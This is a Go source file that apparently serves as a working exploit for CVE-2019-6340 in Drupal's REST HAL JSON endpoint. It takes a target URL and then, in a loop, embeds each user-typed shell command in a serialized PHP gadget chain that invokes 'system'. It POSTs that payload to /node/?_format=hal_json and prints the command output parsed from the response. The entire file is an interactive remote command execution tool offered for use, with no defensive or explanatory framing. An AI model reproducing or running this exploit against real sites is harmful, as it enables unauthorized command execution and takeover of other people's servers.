package main

import (
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strconv"
	"strings"
)

func main() {
	fmt.Println("[*] cve-2019-6340 test starting")
	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url: ")
	url1, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	dir := "/node/?_format=hal_json"
	url2 := string(url1) + dir
	reader2 := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("[*] input cmd: ")
		cmd1, _, err := reader2.ReadLine()
		if err != nil {
			panic(err)
		}
		a := strings.Compare(string(cmd1), "exit")
		if a == 0 {
			return
		}
		cmd1_len := strconv.Itoa(len(string(cmd1)))
		payload1 := fmt.Sprintf("{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%s/rest/type/shortcut/default\"\r\n    }\r\n  }\r\n}", cmd1_len, string(cmd1), string(url1))
		var bytepayload = []byte(payload1)
		req1, err := http.NewRequest("POST", url2, bytes.NewBuffer(bytepayload))
		if err != nil {
			panic(err)
		}
		req1.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0")
		req1.Header.Add("Connection", "close")
		req1.Header.Add("Content-Type", "application/hal+json")
		req1.Header.Add("Accept", "*/*")
		req1.Header.Add("Cache-Control", "no-cache")
		var client http.Client
		rep1, err := client.Do(req1)
		if err != nil {
			panic(err)
		}
		body, err := ioutil.ReadAll(rep1.Body)
		if err != nil {
			panic(err)
		}
		fmt.Println("")
		if strings.Contains(rep1.Status, "403") && strings.Contains(string(body), "u0027access") {
			fmt.Println("[+] successfule!")
			reslut := strings.Split(string(body), "}")
			fmt.Println("[+]", reslut[1])
		} else {
			fmt.Println("[-] error!")
		}
	}

}
